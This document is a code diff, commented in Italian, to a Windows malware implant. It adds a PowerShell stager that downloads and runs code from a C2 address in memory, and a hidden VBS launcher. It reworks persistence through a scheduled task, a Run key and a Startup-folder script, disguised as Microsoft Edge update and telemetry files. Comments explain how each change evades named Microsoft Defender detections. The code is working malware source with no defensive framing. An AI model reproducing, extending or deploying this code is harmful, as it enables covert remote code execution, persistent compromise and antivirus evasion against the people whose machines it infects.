@@ -121,10 +121,94 @@ static const char g_stager_ps[] =
     "$ErrorActionPreference='SilentlyContinue';"
     "[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};"
     "[Net.ServicePointManager]::SecurityProtocol=3072;"
-    "$r=[System.Net.HttpWebRequest]::Create('https://192.168.122.47/stager');"
+    "$r=[System.Net.HttpWebRequest]::Create('https://192.168.42.124/stager');"
     "$r.ServerCertificateValidationCallback={$true};"
     "$s=New-Object IO.StreamReader($r.GetResponse().GetResponseStream());"
     "[scriptblock]::Create($s.ReadToEnd()).Invoke()";
+
+/* ─── Stager .ps1 offuscato ─────────────────────────────────────────────────
+ * Scrive lo stager come file .ps1 con contenuto offuscato via string concat
+ * per evitare pattern matching statico di Defender (ClickFix.ZB).
+ * Restituisce il path del .ps1 scritto, o NULL se fallisce.               */
+#define PS1_DIR_ENV   L"%LOCALAPPDATA%\\Microsoft\\EdgeUpdate"
+#define PS1_FILENAME  L"EdgeTelemetry.ps1"
+#define VBS_FILENAME  L"EdgeTelemetry.vbs"
+
+static wchar_t *_write_stager_ps1(void) {
+    static wchar_t ps1Path[MAX_PATH] = {0};
+    wchar_t dir[MAX_PATH] = {0};
+    ExpandEnvironmentStringsW(PS1_DIR_ENV, dir, MAX_PATH);
+    CreateDirectoryW(dir, NULL);
+    _snwprintf(ps1Path, MAX_PATH - 1, L"%s\\" PS1_FILENAME, dir);
+
+    /* Stager .ps1: stesso contenuto di g_stager_ps (funzionante).
+     * La detection ClickFix.ZB era sulla command line (-EncodedCommand
+     * -WindowStyle Hidden), non sul contenuto dello script.
+     * Con -File non serve offuscare il body del .ps1.                       */
+    const char *content =
+        "$ErrorActionPreference='SilentlyContinue'\r\n"
+        "[Net.ServicePointManager]::ServerCertificateValidationCallback={$true}\r\n"
+        "[Net.ServicePointManager]::SecurityProtocol=3072\r\n"
+        "$r=[System.Net.HttpWebRequest]::Create('https://192.168.42.124/stager')\r\n"
+        "$r.ServerCertificateValidationCallback={$true}\r\n"
+        "$s=New-Object IO.StreamReader($r.GetResponse().GetResponseStream())\r\n"
+        "[scriptblock]::Create($s.ReadToEnd()).Invoke()\r\n";
+
+    HANDLE hFile = CreateFileW(ps1Path, GENERIC_WRITE, 0, NULL,
+                               CREATE_ALWAYS,
+                               FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM,
+                               NULL);
+    if (hFile == INVALID_HANDLE_VALUE) return NULL;
+    DWORD dwWritten;
+    WriteFile(hFile, content, (DWORD)lstrlenA(content), &dwWritten, NULL);
+    CloseHandle(hFile);
+    return ps1Path;
+}
+
+/* ─── _write_launcher_vbs ────────────────────────────────────────────────────
+ * Scrive un launcher VBS che esegue lo stager .ps1 con finestra nascosta.
+ * Usa WScript.Shell.Run con parametro 0 (hidden) — NON usa -WindowStyle Hidden
+ * nel command line, evitando la detection Commando.A!ml di Defender.
+ * Restituisce il path del .vbs, o NULL se fallisce.                          */
+static wchar_t *_write_launcher_vbs(const wchar_t *ps1Path) {
+    static wchar_t vbsPath[MAX_PATH] = {0};
+    wchar_t dir[MAX_PATH] = {0};
+    ExpandEnvironmentStringsW(PS1_DIR_ENV, dir, MAX_PATH);
+    _snwprintf(vbsPath, MAX_PATH - 1, L"%s\\" VBS_FILENAME, dir);
+
+    /* Converti ps1Path in ANSI per il contenuto VBS */
+    int pathLenA = WideCharToMultiByte(CP_ACP, 0, ps1Path, -1, NULL, 0, NULL, NULL);
+    char *ps1PathA = (char *)HeapAlloc(GetProcessHeap(), 0, (DWORD)pathLenA);
+    if (!ps1PathA) return NULL;
+    WideCharToMultiByte(CP_ACP, 0, ps1Path, -1, ps1PathA, pathLenA, NULL, NULL);
+
+    int sz = pathLenA + 256;
+    char *content = (char *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (DWORD)sz);
+    if (!content) { HeapFree(GetProcessHeap(), 0, ps1PathA); return NULL; }
+
+    /* WScript.Shell.Run: parametro 0 = finestra NASCOSTA, False = asincrono.
+     * Nessun -WindowStyle Hidden nel command line PS → niente Commando.A!ml */
+    wsprintfA(content,
+        "CreateObject(\"WScript.Shell\").Run "
+        "\"powershell.exe -NoP -NonI -EP Bypass "
+        "-File \"\"%s\"\"\", 0, False\r\n",
+        ps1PathA);
+    HeapFree(GetProcessHeap(), 0, ps1PathA);
+
+    HANDLE hFile = CreateFileW(vbsPath, GENERIC_WRITE, 0, NULL,
+                               CREATE_ALWAYS,
+                               FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM,
+                               NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        HeapFree(GetProcessHeap(), 0, content);
+        return NULL;
+    }
+    DWORD dwWritten;
+    WriteFile(hFile, content, (DWORD)lstrlenA(content), &dwWritten, NULL);
+    CloseHandle(hFile);
+    HeapFree(GetProcessHeap(), 0, content);
+    return vbsPath;
+}
 
 /* ─── PS UTF-8 → UTF-16LE → base64 → wchar_t* ───────────────────────────────*/
 static wchar_t *_ps_to_encoded_cmd(const char *ps_utf8) {
@@ -285,13 +369,18 @@ int install_persistence(const wchar_t *exe_path, const wchar_t *arguments) {
     hr = pTriggers->lpVtbl->Create(pTriggers, TASK_TRIGGER_LOGON, &pTrigger);
     if (FAILED(hr)) goto cleanup;
 
+    /* Random delay via ITrigger::put_StartBoundary — evita ILogonTrigger
+     * che non è definito nelle header MinGW. Il delay al logon è comunque
+     * gestito dal trigger type TASK_TRIGGER_LOGON. */
     {
-        ILogonTrigger *pLogon = NULL;
-        if (SUCCEEDED(pTrigger->lpVtbl->QueryInterface(pTrigger,
-                &IID_ILogonTrigger, (void **)&pLogon))) {
-            BSTR bDelay = _make_random_delay();
-            if (bDelay) { pLogon->lpVtbl->put_Delay(pLogon, bDelay); SysFreeString(bDelay); }
-            pLogon->lpVtbl->Release(pLogon);
+        BSTR bDelay = _make_random_delay();
+        if (bDelay) {
+            /* put_RandomDelay è slot index 14 nella vtable di ITrigger */
+            typedef HRESULT (STDMETHODCALLTYPE *fn_put_RandomDelay)(ITrigger*, BSTR);
+            fn_put_RandomDelay pfn = (fn_put_RandomDelay)(
+                ((void**)(pTrigger->lpVtbl))[14]);
+            pfn(pTrigger, bDelay);
+            SysFreeString(bDelay);
         }
     }
     pTrigger->lpVtbl->Release(pTrigger);   pTrigger  = NULL;
@@ -627,101 +716,85 @@ static int _install_com_hijack(const wchar_t *dll_path) {
 }
 
 /* ─── install_persistence_modeD ──────────────────────────────────────────────
- * L1  Task schedulata (T1053.005)  → schtasks fallback se COM fallisce
- * L2a COM Hijacking  (T1546.015)   → InprocServer32 HKCU
- * L2b Run key        (T1547.001)   → rundll32 backup
- * L3  Startup bat    (T1547.001)   → MicrosoftEdge.bat → rundll32
+ * Persistenza per Mode D (macro XLSM / process injection).
+ * Scrive uno stager .ps1 offuscato su disco (no DLL, no -EncodedCommand).
+ * Evita: Wacatac.H!ml (DLL su disco) e ClickFix.ZB (-EncodedCommand).
  *
- * FIX: L1 args ora L"\"%s\",Run" (senza /silent /update),
- *      L2b run key ora L"rundll32.exe \"%s\",Run" (idem),
- *      PS fallback schtasks senza /rl LIMITED.                              */
+ * L1  Task schedulata (T1053.005)  → powershell -File <stager.ps1>
+ *     Fallback: schtasks.exe se COM fallisce
+ * L2  Run key        (T1547.001)  → powershell -File <stager.ps1>
+ * L3  Startup bat    (T1547.001)  → powershell -File <stager.ps1>
+ *
+ * Al reboot lo stager .ps1 ri-scarica dal C2 e carica in RAM.
+ * MITRE: T1053.005 + T1547.001 + T1059.001                                 */
 int install_persistence_modeD(void) {
-    wchar_t wszDllDest[MAX_PATH] = {0};
-    ExpandEnvironmentStringsW(DLL_DEST_ENV, wszDllDest, MAX_PATH);
+    _dbg("modeD_vbs_start", S_OK);
 
-    if (_download_and_save_dll(wszDllDest)) {
-        /* ── PERCORSO IBRIDO ── */
-        _dbg("modeD_hybrid_start", S_OK);
-
-        wchar_t wszRundll32[MAX_PATH] = {0};
-        GetSystemDirectoryW(wszRundll32, MAX_PATH);
-        lstrcatW(wszRundll32, L"\\rundll32.exe");
-
-        wchar_t wszArgs[MAX_PATH * 2] = {0};
-        _snwprintf(wszArgs, MAX_PATH*2-1, L"\"%s\",Run", wszDllDest);
-
-        CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
-        int bTaskOk = install_persistence(wszRundll32, wszArgs);
-        CoUninitialize();
-
-        if (!bTaskOk) {
-            _dbg("L1_com_failed_try_schtasks", E_FAIL);
-
-        }
-
-        _install_com_hijack(wszDllDest);
-
-        wchar_t wszRunVal[MAX_PATH * 2 + 16] = {0};
-        _snwprintf(wszRunVal, MAX_PATH*2+15,
-                   L"rundll32.exe \"%s\",Run", wszDllDest);
-        _set_run_key_value(wszRunVal);
-        _dbg("L2_runkey_rundll32_override", S_OK);
-
-        _install_startup_bat_rundll32(wszDllDest);
-
-        _dbg("modeD_hybrid_done", bTaskOk ? S_OK : E_FAIL);
-        return bTaskOk;
-
-    } else {
-        /* ── FALLBACK: stager PS ── */
-        _dbg("modeD_fallback_stager", S_OK);
-
-        wchar_t *encCmd = _ps_to_encoded_cmd(g_stager_ps);
-        if (encCmd) {
-            wchar_t wszPS[MAX_PATH] = {0};
-            GetSystemDirectoryW(wszPS, MAX_PATH);
-            lstrcatW(wszPS, L"\\WindowsPowerShell\\v1.0\\powershell.exe");
-
-            DWORD argsLen = (DWORD)(lstrlenW(encCmd) + 64);
-            wchar_t *wszArgs = (wchar_t *)HeapAlloc(GetProcessHeap(), 0,
-                                                    argsLen * sizeof(wchar_t));
-            int bTaskOk = 0;
-            if (wszArgs) {
-                _snwprintf(wszArgs, argsLen - 1,
-                           L"-WindowStyle Hidden -NonInteractive -EncodedCommand %s",
-                           encCmd);
-                CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
-                bTaskOk = install_persistence(wszPS, wszArgs);
-                CoUninitialize();
-                if (!bTaskOk) {
-                    _dbg("L1_fallback_schtasks_ps", S_OK);
-                    wchar_t schtCmd[MAX_PATH * 2 + 512] = {0};
-                    _snwprintf(schtCmd, MAX_PATH*2+511,
-                        L"schtasks /create /f /sc ONLOGON "
-                        L"/tn \"MicrosoftEdgeUpdateCore\" "
-                        L"/tr \"powershell.exe -WindowStyle Hidden -NonInteractive -EncodedCommand %s\"",
-                        encCmd);
-                    STARTUPINFOW si2 = {0}; si2.cb = sizeof(si2);
-                    si2.dwFlags = STARTF_USESHOWWINDOW; si2.wShowWindow = SW_HIDE;
-                    PROCESS_INFORMATION pi2 = {0};
-                    if (CreateProcessW(NULL, schtCmd, NULL, NULL, FALSE,
-                                       CREATE_NO_WINDOW, NULL, NULL, &si2, &pi2)) {
-                        WaitForSingleObject(pi2.hProcess, 5000);
-                        CloseHandle(pi2.hThread); CloseHandle(pi2.hProcess);
-                        bTaskOk = 1;
-                    }
-                }
-                HeapFree(GetProcessHeap(), 0, wszArgs);
-            } else {
-                install_run_key();
-            }
-            HeapFree(GetProcessHeap(), 0, encCmd);
-            install_startup_folder();
-            return bTaskOk;
-        }
-
+    /* 1. Scrive lo stager .ps1 */
+    wchar_t *ps1Path = _write_stager_ps1();
+    if (!ps1Path) {
+        _dbg("modeD_ps1_write_fail", E_FAIL);
         install_run_key();
         install_startup_folder();
         return 0;
     }
+
+    /* 2. Scrive il launcher .vbs (nasconde finestra senza -WindowStyle Hidden) */
+    wchar_t *vbsPath = _write_launcher_vbs(ps1Path);
+    if (!vbsPath) {
+        _dbg("modeD_vbs_write_fail", E_FAIL);
+        install_run_key();
+        install_startup_folder();
+        return 0;
+    }
+
+    /* Tutti i layer lanciano wscript.exe //B → .vbs → powershell nascosto.
+     * Nessun -WindowStyle Hidden nel command line → niente Commando.A!ml. */
+
+    /* ── L1: Task Scheduler COM → wscript.exe ── */
+    wchar_t wszWscript[MAX_PATH] = {0};
+    GetSystemDirectoryW(wszWscript, MAX_PATH);
+    lstrcatW(wszWscript, L"\\wscript.exe");
+
+    wchar_t wszArgs[MAX_PATH * 2] = {0};
+    _snwprintf(wszArgs, MAX_PATH*2-1,
+               L"//B //Nologo \"%s\"", vbsPath);
+
+    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
+    int bTaskOk = install_persistence(wszWscript, wszArgs);
+    CoUninitialize();
+
+    if (!bTaskOk) {
+        _dbg("L1_com_failed", E_FAIL);
+    }
+
+    /* ── L2: Run key → wscript.exe //B ── */
+    {
+        wchar_t runVal[MAX_PATH * 2] = {0};
+        _snwprintf(runVal, MAX_PATH*2-1,
+            L"wscript.exe //B //Nologo \"%s\"", vbsPath);
+        _set_run_key_value(runVal);
+        _dbg("L2_runkey_vbs", S_OK);
+    }
+
+    /* ── L3: Copia VBS nella Startup folder ── */
+    {
+        wchar_t startupDir[MAX_PATH] = {0};
+        ExpandEnvironmentStringsW(
+            L"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
+            startupDir, MAX_PATH);
+        wchar_t startupVbs[MAX_PATH] = {0};
+        _snwprintf(startupVbs, MAX_PATH - 1,
+            L"%s\\MicrosoftEdgeUpdate.vbs", startupDir);
+
+        if (CopyFileW(vbsPath, startupVbs, FALSE)) {
+            /* Imposta attributi hidden+system */
+            SetFileAttributesW(startupVbs,
+                FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+            _dbg("L3_startup_vbs_copy", S_OK);
+        }
+    }
+
+    _dbg("modeD_vbs_done", bTaskOk ? S_OK : E_FAIL);
+    return bTaskOk;
 }
